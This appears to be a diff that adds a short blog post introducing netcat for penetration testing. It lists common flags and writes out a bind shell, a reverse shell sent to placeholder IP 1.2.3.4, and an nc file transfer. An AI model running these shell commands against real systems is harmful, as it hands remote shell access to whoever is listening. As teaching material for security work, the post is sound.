@@ -1,0 +1,48 @@
+<html>
+    <head>
+        <link rel="stylesheet" type="text/css" href="/css/cjc.css" />
+        <title>cjc.im</title>
+    </head>
+    <body>
+    <div id="main">
+        <h2><a href="/">cjc.im</a>
+ / <a href="/posts">posts</a> / Infosec Intro- Netcat aka nc</h2>
+<p>This post I am going to focus on Netcat, the tcp/ip swiss army knife</p>
+<h3 id="what-is-it">What is it</h3>
+<p>Netcat is described as the swiss army knife of tcp/ip, it's great for setting up adhoc servers for a multitude of reasons</p>
+<h3 id="why">Why</h3>
+<p>At some point in an engagement, you are going to want to send a file, setup a quick bind shell, or reverse shell. This is where nc will come in and be the savior your require. Even better, busybox, which is used in a lot of embedded environments, also has an implementation of netcat that will allow for some of these shenanigans.</p>
+<h3 id="examples">Examples</h3>
+<p>The flags that I tend to use most often are:</p>
+<ul>
+<li><code>-n</code> don't waste time doing dns lookups</li>
+<li><code>-l</code> listen for incoming connections</li>
+<li><code>-v</code> verbose mode</li>
+<li><code>-p</code> port to use when listening</li>
+<li><code>-e</code> send the input/output to a specific binary, ie for doing bind/reverse shells</li>
+</ul>
+<p>To make a bind shell, that is a shell that listens on a port you can do:</p>
+<pre><code>nc -nlvp 1337 -e /bin/bash</code></pre>
+<p>Be aware this would allow someone to connect to port <code>1337</code> and have a shell as the user running the nc command. But what if the box you are able to run commands on is firewalled off? You can then 'send' a reverse shell back to a box you control.</p>
+<p>On your machine listen for incoming connections:</p>
+<pre><code>nc -nlvp 1337</code></pre>
+<p>and then on the machine you are attacking</p>
+<pre><code>nc 1.2.3.4 1337 -e /bin/sh</code></pre>
+<p>which will 'send' the shell to you! great! You can also use <code>nc</code> to send a file to another machine, on the recieving machine:</p>
+<pre><code>nc -nlvp 1337 &gt; incoming.file</code></pre>
+<p>and then on the sending machine</p>
+<pre><code>nc other.machines.public.ip &lt; file.to.send</code></pre>
+<p>Sadly, there will be no progress, so you will have to verify this by other means that it has sent correctly.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Netcat">Wikipedia Netcat page</a></li>
+<li><a href="https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf">Sans Netcat cheat sheet</a></li>
+</ul>
+<strong>Tags: </strong>
+<i><a href="/tag/infosec">infosec</a></i>
+<i><a href="/tag/infosecintro">infosecintro</a></i>
+        <br />
+        </div>
+        </div>
+    </body>
+</html>
